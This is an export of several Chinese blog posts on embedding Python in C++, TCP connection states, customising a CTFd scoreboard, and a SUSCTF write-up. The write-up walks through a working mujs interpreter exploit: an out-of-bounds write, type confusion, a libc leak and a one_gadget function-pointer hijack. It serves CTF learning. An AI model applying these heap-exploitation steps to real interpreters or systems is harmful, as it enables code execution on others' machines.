[{"title":"在C/C++中调用python代码","date":"2022-08-04T02:22:29.000Z","path":"year/08/04/cl6ewldb40052j63fmhaib0ag/","text":"最近使用C++实现了一个fuzz。但是发现对应目标有认证流程，我的fuzz代码上也得加上这个加密认证逻辑才能正常工作。经过谷哥的帮助，在网上找到了一段python实现的加密认证逻辑。 让我自己用C++重写？那是不可能的，于是就走上了用C++调用python的踩坑之路。 0x01 执行简单Python代码如果我们应用的场景并不复杂，比如知识想执行一段简单的python代码。那么你只需要了解以下内容 在头文件中包含Python.h头文件 使用Py_Initialize() 初始化python解析器 使用PyRun_SimpleString执行python代码 Py_Finalize 释放python解析器 以下就是一个实现的demo 12345678//test.cpp#include &lt;Python.h&gt;int main()&#123; Py_Initialize(); ##初始化 PyRun_SimpleString(\"print('hello')\"); Py_Finalize(); ##释放资源 &#125; 注意在链接的时候加上对应的库，编译指令如下 1g++ test.cpp -I/usr/include/python3.8 -l python3.8 0x02 执行简单python脚本中的函数2.1 无参数与返回值有的时候我们需要调用python脚本中的函数来实现一些功能，假设这个时候我们有这样一个脚本 123#cat script/sayHello.pydef say(): print(\"hello\") 然后我们需要了解一些常用api 123456789101112131415161718192021//导入函数相关PyObject* PyModule_GetDict( PyObject *module) /* PyModule_GetDict()函数可以获得Python模块中的函数列表。PyModule_GetDict()函数返回一个字典。字典中的关键字为函数名，值为函数的调用地址。字典里面的值可以通过PyDict_GetItemString()函数来获取，其中p是PyModule_GetDict()的字典，而key则是对应的函数名*/PyObject* PyObject_GetAttrString(PyObject *o, char *attr_name) /* PyObject_GetAttrString()返回模块对象中的attr_name属性或函数，相当于Python中表达式语句：o.attr_name *///调用函数相关PyObject* PyObject_CallObject( PyObject *callable_object, PyObject *args)PyObject* PyObject_CallFunction( PyObject *callable_object, char *format, ...) /* 使用上面两个函数可以在C程序中调用Python中的函数。callable_object为要调用的函数对象，也就是通过上述导入函数得到的函数对象，而区别在于前者使用python的tuple来传参，后者则使用类似c语言printf的风格进行传参。如果不需要参数，那么args可能为NULL。返回成功时调用的结果，或失败时返回NULL。这相当于Python表达式 apply(callable_object, args) 或 callable_object(*args)*/ 我们可以像下面这样去加载调用模块，并调用指定的函数 12345678910111213141516171819202122232425262728293031#include &lt;python2.7/Python.h&gt;#include &lt;iostream&gt;using namespace std;int main()&#123; Py_Initialize(); if( !Py_IsInitialized())&#123; cout &lt;&lt; \"python init fail\" &lt;&lt; endl; return 0; &#125; PyRun_SimpleString(\"import sys\"); PyRun_SimpleString(\"sys.path.append('./script')\"); PyObject* pModule = PyImport_ImportModule(\"sayHello\"); if( pModule == NULL )&#123; cout &lt;&lt;\"module not found\" &lt;&lt; endl; return 1; &#125; PyObject* pFunc = PyObject_GetAttrString(pModule, \"say\"); if( !pFunc || !PyCallable_Check(pFunc))&#123; cout &lt;&lt;\"not found function add_num\" &lt;&lt; endl; return 0; &#125; PyObject_CallObject(pFunc, NULL ); Py_Finalize(); return 0;&#125; 2.2有参数与返回值参数构建在Python/C API中提供了Py_BuildValue()函数对数字和字符串进行转换处理，使之变成Python中相应的数据类型。其函数原型如下所示 12345PyObject* Py_BuildValue( const char *format, ...) /* Py_BuildValue()提供了类似c语言printf的参数构造方法，format是要构造的参数的类型列表，函数中剩余的参数即要转换的C语言中的整型、浮点型或者字符串等。其返回值为PyObject型的指针。*/ format对应的类型列表如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100s(str或None)[char *]使用'utf-8'编码将以null结尾的C字符串转换为Python str对象。如果C字符串指针为NULL，则表示None。s＃(str或None)[char *，int]使用'utf-8'编码将C字符串及其长度转换为Python str对象。如果C字符串指针为NULL，则忽略长度返回None。y(字节)[char *]这会将C字符串转换为Python字节对象。如果C字符串指针为NULL，则返回None。y＃(字节)[char *，int]这会将C字符串及其长度转换为Python对象。如果C字符串指针为NULL，则返回None。z(str或None)[char *]与s相同。z＃(str或None)[char *，int]与s＃相同。u(str)[Py_UNICODE *]将Unicode(UCS-2或UCS-4)数据的以null结尾的缓冲区转换为Python Unicode对象。如果Unicode缓冲区指针为NULL，则返回None。u＃(str)[Py_UNICODE *，int]将Unicode(UCS-2或UCS-4)数据缓冲区及其长度转换为Python Unicode对象。如果Unicode缓冲区指针为NULL，则忽略长度并返回None。U(str或None)[char *]与s相同。U＃(str或None)[char *，int]与s＃相同。i(int)[int]将普通的C int转换为Python整数对象。b(int)[char]将纯C char转换为Python整数对象。h(int)[short int]将普通的C short int转换为Python整数对象。l(int)[long int]将C long int转换为Python整数对象。B(int)[unsigned char]将C unsigned char转换为Python整数对象。H(int)[unsigned short int]将C unsigned short int转换为Python整数对象。I(int)[unsigned int]将C unsigned int转换为Python整数对象。k(int)[unsigned long]将C unsigned long转换为Python整数对象。L(int)[long long]将C long long转换为Python整数对象。K(int)[unsigned long long]将C unsigned long long转换为Python整数对象。n(int)[Py_ssize_t]将C Py_ssize_t转换为Python整数。c(长度为1的字节)[char]将表示字节的C int转换为长度为1的Python字节对象。C(长度为1的str)[int]将表示字符的C int转换为长度为1的Python str对象。d(float) [double] 将C double转换为Python浮点数。f(float) [float] 将C float转换为Python浮点数。D(complex) [Py_complex *]将C Py_complex结构转换为Python复数。O(object) [PyObject *]不改变Python对象的传递(引用计数除外，它增加1)。如果传入的对象是NULL指针，则假定这是因为产生参数的调用发现错误并设置了异常。因此，Py_BuildValue()将返回NULL但不会引发异常。如果尚未引发异常，则设置SystemError。S(object) [PyObject *]与O相同N((object) [PyObject *]与O相同，但不会增加对象的引用计数。通过调用参数列表中的对象构造函数创建对象时很有用。O＆(object) [converter, anything] 通过转换器函数将任何内容转换为Python对象。该函数被调用任何东西(应与void *兼容)作为其参数，并应返回“新”Python对象，如果发生错误则返回NULL。(items) (tuple) [matching-items] 将一系列C值转换为具有相同项目数的Python元组。[items](list) [matching-items]将一系列C值转换为具有相同项目数的Python列表。&#123;items&#125;(dict) [matching-items] 将一系列C值转换为Python字典。每对连续的C值将一个项添加到字典中，分别用作键和值。如果格式字符串中存在错误，则设置SystemError异常并返回NULL。 返回值python函数的返回值也是PyObject类型，因此，在python脚本返回到C/C++之后，需要解构Python数据为C的类型，这样C/C++程序中才可以使用Python里的数据。但是，由于python的返回值有多种数据结构类型，因此，我们需要为每个类型进行转换。不过由于篇幅问题，我们只是介绍简单的整形和字符串类型的处理，其他类型的返回见文末的github链接，总体思路都是根据类型逐个从值从PyObject中提取。python提供了下面函数来完成这个功能 12int PyArg_Parse( PyObject *args, char *format, ...) 根据format把args的值转换成c类型的值，format接受的类型和上述Py_BuildValue()的是一样的 释放资源Python使用引用计数机制对内存进行管理，实现自动垃圾回收。在C/C++中使用Python对象时，应正确地处理引用计数，否则容易导致内存泄漏。在Python/C API中提供了Py_CLEAR()、Py_DECREF()等宏来对引用计数进行操作。当使用Python/C API中的函数创建列表、元组、字典等后，就在内存中生成了这些对象的引用计数。在对其完成操作后应该使用Py_CLEAR()、Py_DECREF()等宏来销毁这些对象。其原型分别如下所示 1234void Py_CLEAR(PyObject *o)void Py_DECREF(PyObject *o)其中，o的含义是要进行操作的对象。对于Py_CLEAR()其参数可以为NULL指针，此时，Py_CLEAR()不进行任何操作。而对于Py_DECREF()其参数不能为NULL指针，否则将导致错误。 下面是个简单的例子，在例子中会有输出和返回值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/*cat script/Py2Cpp.pydef add_num(a,b): return a+b*/#include &lt;python2.7/Python.h&gt;#include &lt;iostream&gt;using namespace std;int main()&#123; Py_Initialize(); if( !Py_IsInitialized())&#123; cout &lt;&lt; \"python init fail\" &lt;&lt; endl; return 0; &#125; PyRun_SimpleString(\"import sys\"); PyRun_SimpleString(\"sys.path.append('./script')\"); PyObject* moduleName = PyString_FromString(\"Py2Cpp\"); PyObject* pModule = PyImport_Import(moduleName); if( pModule == NULL )&#123; cout &lt;&lt;\"module not found\" &lt;&lt; endl; return 1; &#125; PyObject* pFunc = PyObject_GetAttrString(pModule, \"add_num\"); if( !pFunc || !PyCallable_Check(pFunc))&#123; cout &lt;&lt;\"not found function add_num\" &lt;&lt; endl; return 0; &#125; PyObject* args = Py_BuildValue(\"(ii)\", 28, 103); PyObject* pRet = PyObject_CallObject(pFunc, args ); Py_DECREF(args); int res = 0; PyArg_Parse(pRet, \"i\", &amp;res ); Py_DECREF(pRet); cout &lt;&lt; res &lt;&lt; endl; Py_Finalize(); return 0;&#125; 2.3 调用类中的函数大概流程是： 第一步，导入python文件，如前文所述 第二步，导入已经导入的模块的方法或类 第三步，使用导入的方法或类 第四步，释放资源 下面结合具体例子来分析 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253Py_Initialize(); if (!Py_IsInitialized())&#123; printf(\"Inital failed \\n\"); exit(-1); &#125; PyGC_Collect(); PyRun_SimpleString(\"import sys\"); PyRun_SimpleString(\"sys.path.append('../src/decrpt_func/')\"); //import testpy.py std::cerr &lt;&lt; \"Called\" &lt;&lt; std::endl; PyObject *pModule = PyImport_ImportModule(\"testpy\"); if(!pModule) &#123; std::cerr &lt;&lt; \" Moudle load worong\" &lt;&lt; std::endl; return false; &#125; //使用PyObject* pDict来存储导入模块中的方法字典, 调用的方法是PyModule_GetDict(module): PyObject* pDict = PyModule_GetDict(pModule); PyObject *pDict = PyModule_GetDict(pModule); if (!pDict) &#123; std::cerr &lt;&lt; \" Dict worong\" &lt;&lt; std::endl; return false; &#125; //使用PyDict_GetItemString可以获得该模块中的方法或类，此处导入了Person类 PyObject *pClass = PyDict_GetItemString(pDict, \"Person\"); if(!pClass) &#123; std::cerr &lt;&lt; \" class worong\" &lt;&lt; std::endl; return false; &#125; //使用PyInstanceMethod_New获取了类的构造函数方法 PyObject *pConstruct = PyInstanceMethod_New(pClass); if(! pConstruct) &#123; std::cerr &lt;&lt; \" construct woronbg\" &lt;&lt; std::endl; return false; &#125; //使用PyObject_CallObject调用类的构造函数方法，同时生成示例instance PyObject *pInstance = PyObject_CallObject(pConstruct, NULL); this-&gt;pInstance = pInstance; if (!pInstance) &#123; std::cerr &lt;&lt; \" Person instance failed\" &lt;&lt; std::endl; return false; &#125; //使用Person类对象的auth方法 PyObject_CallMethod(this-&gt;pInstance, \"auth\", \"(ss)\", \"admin\", \"123qwe\"); //如果调用时python出现错误，那么输出 PyErr_Print(); //释放 Py_DECREF(pInstance); Py_DECREF(pClass); Py_DECREF(pDict); Py_DECREF(pModule); // 关闭虚拟机 Py_Finalize(); 0x03 遇到的问题类似于下图这种会出现内存泄漏 12345678910111213141516#include &lt;Python.h&gt;#include &lt;iostream&gt;int main()&#123; std::cout &lt;&lt; \"Python version: \" &lt;&lt; PY_VERSION &lt;&lt; std::endl; while (true) &#123; Py_Initialize(); //PyGC_Collect(); Py_Finalize(); &#125; return 0;&#125; [解决方案](c++ - Memory leak when embedding python into my application - Stack Overflow) 0x04 参考[C++调用python脚本 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/79896193#:~:text=C%2FC%2B%2B中调用,的所有初始化， 并销毁) C调用python类的正确方法_hnlylyb的博客-CSDN博客_c调用python类的正确方法 [C++/Python] 如何在C++中使用一个Python类? (Use Python-defined class in C++) - Lancelod_Liu - 博客园 (cnblogs.com) How to embed Python code in C program (xmodulo.com)","tags":[{"name":"编程","slug":"编程","permalink":"wood1314.github.io/tags/编程/"}]},{"title":"TCP/IP协议安全问题","date":"2022-07-01T02:55:05.000Z","path":"year/07/01/cl6ewld9m001ij63fetpu0pcv/","text":"学习一下tcp阻断。 TCP基础知识1.1 TCP报文格式 在TCP/IP 连接中比较重要的有 源端口 目的端口 数据序号 确认序号 源IP 目的IP 1.2 TCP链接状态​ TCP连接生命周期状态： LISTEN等待远程的TCP连接请求 SYS_SENT 发送了建立连接的请求，等待确认消息 SYN_RECIVED 收到了对方建立连接的请求并发送了建立连接的请求。等待对方确认自己发送的链接请求 ESTABLISHED 连接已经建立，可以进行正常数据传输 FIN_WAIT_1 等待对方确认刚刚发送的关闭连接的请求 FIN_WAIT_2 收到关闭连接请求的确认，等待对方发送关闭连接的请求 CLOSE_WAIT确认了对方的关闭连接请求，等待本地用户关闭连接指令 LAST-ACK 被动关闭的一方，在CLOSE-WAIT状态下收到用户关闭连接的指令，发送关闭连接请求，等待确认 TIME-WAIT 主动关闭连接的一方收到对方发送的对方关闭连接请求的确认消息后,等待足够长的时间（2MSL）以确保对方接收到ACK包.最后回到CLOSED状态，释放网络资源 CLOSED 关闭状态 1.3 三次握手​ （1）第一次握手：建立连接时，客户端A发送SYN包（SYN=j）到服务器B，并进入SYN_SEND状态，等待服务器B确认。 （2）第二次握手：服务器B收到SYN包，必须确认客户A的SYN（ACK=j+1），同时自己也发送一个SYN包（SYN=k），即SYN+ACK包，此时服务器B进入SYN_RECV状态。 （3）第三次握手：客户端A收到服务器B的SYN＋ACK包，向服务器B发送确认包ACK（ACK=k+1），此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。 1.4 四次挥手 由于TCP连接是全双工的，因此每个方向都必须单独进行关闭。这个原则是当一方完成它的数据发送任务后就能发送一个FIN来终止这个方向的连接。收到一个 FIN只意味着这一方向上没有数据流动，一个TCP连接在收到一个FIN后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。 CP的连接的拆除需要发送四个包，因此称为四次挥手(four-way handshake)。客户端或服务器均可主动发起挥手动作，在socket编程中，任何一方执行close()操作即可产生挥手操作。 （1）客户端A发送一个FIN，用来关闭客户A到服务器B的数据传送。 （2）服务器B收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。和SYN一样，一个FIN将占用一个序号。 （3）服务器B关闭与客户端A的连接，发送一个FIN给客户端A。 （4）客户端A发回ACK报文确认，并将确认序号设置为收到序号加1。 以上就是TCP协议关闭连接的过程，现在说一下TIME_WAIT状态。从上面可以看到，主动发起关闭连接的操作的一方将达到TIME_WAIT状态，而且这个状态要保持Maximum Segment Lifetime的两倍时间。 原因有二：一、保证TCP协议的全双工连接能够可靠关闭二、保证这次连接的重复数据段从网络中消失 先说第一点，如果Client直接CLOSED了，那么由于IP协议的不可靠性或者是其它网络原因，导致Server没有收到Client最后回复的ACK。那么Server就会在超时之后继续发送FIN，此时由于Client已经CLOSED了，就找不到与重发的FIN对应的连接，最后Server就会收到RST而不是ACK，Server就会以为是连接错误把问题报告给高层。这样的情况虽然不会造成数据丢失，但是却导致TCP协议不符合可靠连接的要求。所以，Client不是直接进入CLOSED，而是要保持TIME_WAIT，当再次收到FIN的时候，能够保证对方收到ACK，最后正确的关闭连接。 再说第二点，如果Client直接CLOSED，然后又再向Server发起一个新连接，我们不能保证这个新连接与刚关闭的连接的端口号是不同的。也就是说有可能新连接和老连接的端口号是相同的。一般来说不会发生什么问题，但是还是有特殊情况出现：假设新连接和已经关闭的老连接端口号是一样的，如果前一次连接的某些数据仍然滞留在网络中，这些延迟数据在建立新连接之后才到达Server，由于新连接和老连接的端口号是一样的，又因为TCP协议判断不同连接的依据是socket pair，于是，TCP协议就认为那个延迟的数据是属于新连接的，这样就和真正的新连接的数据包发生混淆了。所以TCP连接还要在TIME_WAIT状态等待2倍MSL，这样可以保证本次连接的所有数据都从网络中消失。 1.5 TCP 中的 RSTRST：（Reset the connection）用于复位因某种原因引起出现的错误连接，也用来拒绝非法数据和请求。如果接收到RST位时候，通常发生了某些错误；发送RST包关闭连接时，不必等缓冲区的包都发出去，直接就丢弃缓冲区中的包，发送RST；接收端收到RST包后，也不必发送ACK包来确认。 何时发送RST1：如果连接是CLOSE状态，所有收到的包都响应RST，仍然保持CLOSED状态如果收到的是ACK报文，RST取ACK报文的ACK序列号为RST报文的SEQ；如果报文不是ACK报文，RST的SEQ为0且ACK字段为收到的报文SEQ+报文长度； 2：如果连接在non-synchronized状态（LISTEN/SYN-SENT/SYN-RECEIVED），收到的报文ACK的无效的序列号（发送的SYN没有被确认），需要返回RST报文；连接保持原有状态；如果是ACK报文，RST取ACK报文的ACK序列号为RST报文的SEQ；如果报文不是ACK报文，RST的SEQ为0且ACK字段为收到的报文SEQ+报文长度； 3：如果连接在synchronized状态（ESTABLISHED,FIN-WAIT-1, FIN-WAIT-2, CLOSE-WAIT, CLOSING, LAST-ACK, TIME-WAIT）,如果收到不可接受的报文（序列号不在接收窗口内或者ack的字段不正确），只发送一个确认报文（ACK字段为期望ACK的序列号，SEQ为当前发送序列号），状态变保持原样； 收到RST报文如何处理收到RST报文，除了SYN-SENT状态，都需要校验SEQ字段是否在接收窗口；SYN-SENT状态下，如果RST的确认了刚刚发送的SYN报文，RST才有效； 校验了RST报文后，如果是在LISTEN状态则保持该状态不需要改变；如果是在SYN-RECIEVED状态且之前在LISTEN状态，恢复为LISTEN状态，如果之前为SYN-RECIEVED状态且之前不是LISTEN状态，则CLOSED；其他状态，关闭连接通知用户，状态变为CLOSED 针对tcp的攻击未完待续","tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"wood1314.github.io/tags/计算机网络/"}]},{"title":"SUSCTF mujs 复现","date":"2022-02-28T16:01:04.000Z","path":"year/03/01/cl6ewld9q001lj63f1f1v5ujw/","text":"这次跟着SU参加SUSCTF取得了第一名的成绩，希望SU战队越来越好！这道mujs当时自己只看出了有越界写操作，想到了可以进行一个类型混淆的利用，但是最后还是队友做出来了。在此记录一下复线思路（翻译一下队友详细的wp）。 题目描述出题人给出的题目描述如下 12dd0a0972b4428771e6a3887da2210c7c9dd40f9c nc 124.71.182.21 9999 在附件中有mujs的源码，这个是一个在嵌入式设备上常用的js代码解释器。这个源码的代码量还是很大的。同时附件里还有一个编译好的二进制文件，以及libc文件。从libc文件可以得知远程的运行环境是libc.2.31 题目描述中给出的这个hash字符告诉我们这个源码是来自于这个hash对应的commit的mujs源码 https://github.com/ccxvii/mujs/commit/dd0a0972b4428771e6a3887da2210c7c9dd40f9c 所以使用diff对比了这两个源码。发现主要的差别在两个地方 一些内置方法在main.c中被禁用了 新增了dataview.c文件。这个是[DataView](DataView - JavaScript | MDN (mozilla.org))方法的一个简化版的实现 寻找漏洞点队友的思路首先是从最近的CVE里寻找一些漏洞，但是没有发现有用的信息，所以这个题应该是魔改的这个版本的源码。而且被魔改的部分其实代码量不算大，直接审就好了。 首先我们需要理解DataView都做了什么，都有哪些方法。一些常用的用法如下所示。 123456x = new DataView(10)print(x.getUint8(0))print(x.getUint8(9))print(x.getUint8(12)) // should not workprint(x.setUint32(0, 10))... 其实从jsB_initdataview函数当中大概可以看出来都有哪些方法，然后自己试一下就可以试出来这些方法怎么用 123456789101112131415void jsB_initdataview(js_State *J)&#123; js_pushobject(J, J-&gt;DataView_prototype); &#123; jsB_propf(J, \"DataView.prototype.getUint8\", Dv_getUint8, 1); jsB_propf(J, \"DataView.prototype.setUint8\", Dv_setUint8, 2); jsB_propf(J, \"DataView.prototype.getUint16\", Dv_getUint16, 1); jsB_propf(J, \"DataView.prototype.setUint16\", Dv_setUint16, 2); jsB_propf(J, \"DataView.prototype.getUint32\", Dv_getUint32, 1); jsB_propf(J, \"DataView.prototype.setUint32\", Dv_setUint32, 2); jsB_propf(J, \"DataView.prototype.getLength\", Dv_getLength, 0); &#125; js_newcconstructor(J, jsB_new_DataView, jsB_new_DataView, \"DataView\", 0); js_defglobal(J, \"DataView\", JS_DONTENUM);&#125; 然后经过一阵审计，很容易就能发现这里存在一个越界写操作，可以越界写9字节 123456789101112static void Dv_setUint8(js_State *J)&#123; js_Object *self = js_toobject(J, 0); if (self-&gt;type != JS_CDATAVIEW) js_typeerror(J, \"not an DataView\"); size_t index = js_tonumber(J, 1); uint8_t value = js_tonumber(J, 2); if (index &lt; self-&gt;u.dataview.length+0x9) &#123; self-&gt;u.dataview.data[index] = value; &#125; else &#123; js_error(J, \"out of bounds access on DataView\"); &#125;&#125; 值得注意的是这里同时也存在一个整数溢出（但是是无符号的)，可以让我们可以前溢9字节。但是由于这里没有什么free的操作，所以很难利用。因此还是后溢9字节可用性高一点。 利用漏洞类型混淆因为说溢出9字节，这个多出的一字节很容易令人联想到类型混淆。下面是 js_Object 的结构。可见只要溢出一字节就可以覆盖它的type字段。 1234567struct js_Object&#123; enum js_Class type; int extensible; js_Property *properties; ...&#125; 下面给出类型混淆的poc 123456789b = DataView(0x68);a = DataView(0x48);b = DataView(0x48);c = DataView(0x48);print(c)b.setUint8(0x48+8, 8); // change type of c to somethingprint(c) 输出为 12[object DataView][object String] 越界写Dataview的Length字段js_Objec 使用了 C语言里的union结构，所以不同类型可以共用相同的内存。队友的想法是利用与DataView里Length字段占用内存相同的其他类型的字符来修改DataLength。这样我们就可以扩大任意地址读写的范围，起码可以拓展到整个堆上了，而不仅仅是越界9字节。 整个Js_Objec 结构体如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849struct js_Object&#123; enum js_Class type; int extensible; js_Property *properties; int count; js_Object *prototype; union &#123; int boolean; double number; struct &#123; const char *string; int length; &#125; s; struct &#123; int length; &#125; a; struct &#123; js_Function *function; js_Environment *scope; &#125; f; struct &#123; const char *name; js_CFunction function; js_CFunction constructor; int length; void *data; js_Finalize finalize; &#125; c; js_Regexp r; struct &#123; js_Object *target; js_Iterator *head; &#125; iter; struct &#123; const char *tag; void *data; js_HasProperty has; js_Put put; js_Delete delete; js_Finalize finalize; &#125; user; struct &#123; uint32_t length; uint8_t* data; &#125; dataview; &#125; u;// ...&#125;; 比如js_Object.u.dataview.length 在结构体内所处的偏移是和js_Object.u.number 以及s_Object.u.c.name这两个是相同的。 所以我们可以修改js_Object.u.number，队友找到了下面的代码 12345678910111213static void js_setdate(js_State *J, int idx, double t)&#123; js_Object *self = js_toobject(J, idx); if (self-&gt;type != JS_CDATE) js_typeerror(J, \"not a date\"); self-&gt;u.number = TimeClip(t); js_pushnumber(J, self-&gt;u.number);&#125;// ... called from herestatic void Dp_setTime(js_State *J)&#123; js_setdate(J, 0, js_tonumber(J, 1));&#125; 让我们试一下 JS_CDATE的值是10，我们需要把这个DataView结构的type字段溢出成10就可以了 12345678910b = DataView(0x68);a = DataView(0x48);b = DataView(0x48);c = DataView(0x48);print(c)b.setUint8(0x48+8, 10); // set type of c to Dateprint(c)c.setTime(0) 结果： 1234[object DataView][object Date]TypeError: undefined is not callable at tconf.js:10 Emmm，居然是报错了。难道进行了类型混淆还是不能调用setTime方法么？队友曾经为了这个问题困扰了许久，他意识到了对象的prototype 在我们一创建的时候其实就已经确定了。所以当我们改变type的时候prototype并没有改变。而prototype基本就已经定义了这个对象可以调用哪些方法，可恶。 这时无敌的队友发现，js里有个讨厌的东西叫 this，这个东西在这个时候算是雪中送碳吧 我们仍然可以通过js的bind调用setTime : 1Date.prototype.setTime.bind(c)(12) 成功了！ 12345678910111213b = DataView(0x68);a = DataView(0x48);b = DataView(0x48);c = DataView(0x48);print(c)b.setUint8(0x48+8, 10); // set type of c to Dateprint(c)Date.prototype.setTime.bind(c)(1.09522e+12)b.setUint8(0x48+8, 16); // type of c back to DataViewprint(c.getLength()) 看到这里大家可能会有些疑问，就是u.number是8字节的double类型，而我们要覆盖的u.dataview.length只有四字节，这样会不会覆盖到后面紧跟着的四字节的u.dataview.data，毕竟这个是个指针，覆盖掉了容易导致crash。其实是不会的，因为这个结构体有8字节对齐。 使用堆上的越界读写来实现代码执行到了这个阶段，我们已经可以通过修改dataview的length字段来实现堆上的任意地址读写了。并且堆布局也是我们相对可控的了。为了更好的控制堆上的结构，我的队友在c后面又申请了两个Dataview。并且我们知道，如果我们申请的堆的大小大于128k的话我们会使用mmap来申请空间，这个是malloc函数的一个策略。而这个mapp的地址往往距离libc地址很近，因此我们可以通过这种方法来泄漏libc基地址。 所以我们用上述的方法泄漏了libc地址之后，可以伪造一个JS_CCFUNCTION类型，他有一个字段叫做u.c.function我们可以轻易用下面的方式调用这个函数指针 123456void js_call(js_State *J, int n)&#123;// ... jsR_callfunction(J, n, obj-&gt;u.f.function, obj-&gt;u.f.scope);// ...&#125; 最终exp1234567891011121314151617181920212223242526272829303132b = DataView(0x68);a = DataView(0x48);b = DataView(0x48);c = DataView(0x48);e = DataView(0x48);f = DataView(0x1000 * 0x1000);b.setUint8(0x48+8, 10); // set c type to DateDate.prototype.setTime.bind(c)(1.09522e+12) // write number + lengthb.setUint8(0x48+8, 16); // set c type back to DataViewsh32 = 4294967296 // 1&lt;&lt;32libb_addr_off = 472libc_leak = c.getUint32(libb_addr_off) + (c.getUint32(libb_addr_off+4)*sh32)libc_off = 0x7ffff7c31000 - 0x7ffff6bfe010 // got this from gdblibc_base = libc_leak + libc_offprint('libc base:', libc_base.toString(16))one_gag = libc_base + 0xe6c84print('onegadget:', one_gag.toString(16))e_obj_off = 192c.setUint8(160, 4) // this sets type to JS_CCFUNCTION// set lower 4 bytes of js_CFunction functionc.setUint32(e_obj_off+8, one_gag&amp;0xffffffff) // set upper 4 bytes of js_CFunction functionc.setUint32(e_obj_off+8+4, Math.floor(one_gag/sh32)&amp;0xffffffff) e() // e is now a function so we can call it 队友表示他之前也没做过这种mujs的利用，但是这些堆利用的基本思路和很多大型项目比如v8的利用是共通的，但是那些大型项目由于运行时更为复杂，堆空间要相对更不可控一些。","tags":[{"name":"writeup","slug":"writeup","permalink":"wood1314.github.io/tags/writeup/"},{"name":"堆","slug":"堆","permalink":"wood1314.github.io/tags/堆/"},{"name":"pwn writeup","slug":"pwn-writeup","permalink":"wood1314.github.io/tags/pwn-writeup/"}]},{"title":"NUAACTF靶场搭建总结","date":"2022-01-17T03:24:02.000Z","path":"year/01/17/cl6ewld99000zj63flysqtfqc/","text":"这次NUAACTF面向所有高校参赛，因此使用了ctfd的whale插件来实现动态flag，然后又对ctfd进行一些魔改，实现校外校内榜分开排名的功能。 部署参考文章 ctfd使用ctfd-whale动态靶机插件搭建靶场指南 | VaalaCat 修改好的代码推到了 Asuri-Team/NUAA-CTfd (github.com) 0x00 引言 第六届南京航空航天大学网络攻防大赛 AsuriCTF / NUAACTF 2021 承办单位：由南京航空航天大学信息化处、南京航空航天大学教务处、共青团南京航空航天大学委员会指导，南京航空航天大学计算机科学与技术学院承办，Asuri信息安全战队，南京航空航天大学学生网络安全与信息技术协会协办，奇安信科技集团股份有限公司独家赞助。 活动对象：南京航空航天大学全体学生，校外对信息安全感兴趣的同学。 报名时间：2021年11月22日0:00-12月6日12:00 比赛时间：2021年12月11日13:00-18:00（最后实际是到 19:00） 作为这次NUAACTF的举办者，有一说一办比赛是真的烦。拉赞助，协调学校场地，做宣传等焦头烂额。而且最后因为疫情缘故不得不改成了线上，而且最后还有很多没做到位的地方。但想想去年这个时候，我们就是与miao师傅在校赛上相识，从此到深圳，郑州一起快乐比赛。自己也是从校赛入门，一起和朱师傅共同学习PWN方向。如果没有校赛，没有曹师傅，朱师傅，帆哥哥，我可能也不会接触到ctf，也没有动力继续走下去。希望校赛能越办越好，大家都能从校赛里获得快乐，提升技术，找到志同道合的伙伴一起进步。 0x01 针对校赛对ctfd进行的二次开发ScoreBoard校内外分类基于注册时填写的Affiliation字段进行分类，这里只对填写值为NUAA的人员判定为校内人员，其他都是校外人员。注意此字段因为我魔改时候的bug，即使校外人员注册也不要填为空，不然会在查询时索引不到，最好设置一个默认初始值。 下面是具体更改： 首先在/CTFd/CTFd/themes/core/templates/scoreboard.html添加下拉框： 123456&lt;select class=\"form-control custom-select w-10\" onchange=\"top.location.href=this.value\"&gt; &lt;option value=\"/\"&gt;排名方式&lt;/option&gt; &lt;option value=\"/scoreboard\"&gt;总排名&lt;/option&gt; &lt;option value=\"/scoreboard/1\"&gt;校内排名&lt;/option&gt; &lt;option value=\"/scoreboard/2\"&gt;校外排名&lt;/option&gt;&lt;/select&gt; 更改/CTFd/utils/scores/__init__.py 里的get_standings 查询方式： 增加参数12@cache.memoize(timeout=60)def get_standings(count=None, admin=False, fields=None, request=0): 分情况查询12345678910111213141516171819202122232425262728293031323334353637383940414243else: if request == 0: standings_query = ( db.session.query( Model.id.label(\"account_id\"), Model.oauth_id.label(\"oauth_id\"), Model.name.label(\"name\"), Model.affiliation.label(\"affiliation\"), sumscores.columns.score, *fields, ) .join(sumscores, Model.id == sumscores.columns.account_id) .filter(Model.banned == False, Model.hidden == False) .order_by(sumscores.columns.score.desc(), sumscores.columns.id) ) elif request == 1: standings_query = ( db.session.query( Model.id.label(\"account_id\"), Model.oauth_id.label(\"oauth_id\"), Model.name.label(\"name\"), Model.affiliation.label(\"affiliation\"), sumscores.columns.score, *fields, ) .join(sumscores, Model.id == sumscores.columns.account_id) .filter(Model.banned == False, Model.hidden == False, Model.affiliation == \"NUAA\") .order_by(sumscores.columns.score.desc(), sumscores.columns.id) ) elif request == 2: standings_query = ( db.session.query( Model.id.label(\"account_id\"), Model.oauth_id.label(\"oauth_id\"), Model.name.label(\"name\"), Model.affiliation.label(\"affiliation\"), sumscores.columns.score, *fields, ) .join(sumscores, Model.id == sumscores.columns.account_id) .filter(Model.banned == False, Model.hidden == False, Model.affiliation != \"NUAA\") .order_by(sumscores.columns.score.desc(), sumscores.columns.id) ) 默认总榜是0，校内是1，校外是2 然后在/CTFd/scoredboard.py 添加路由: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748@scoreboard.route(\"/scoreboard\")@check_score_visibilitydef listing(): infos = get_infos() if config.is_scoreboard_frozen(): infos.append(\"Scoreboard has been frozen\") if is_admin() is True and scores_visible() is False: infos.append(\"Scores are not currently visible to users\") clear_standings() standings = get_standings() return render_template(\"scoreboard.html\", standings=standings, infos=infos)@scoreboard.route(\"/scoreboard/1\")@check_score_visibilitydef listing1(): infos = get_infos() if config.is_scoreboard_frozen(): infos.append(\"Scoreboard has been frozen\") if is_admin() is True and scores_visible() is False: infos.append(\"Scores are not currently visible to users\") clear_standings() standings = 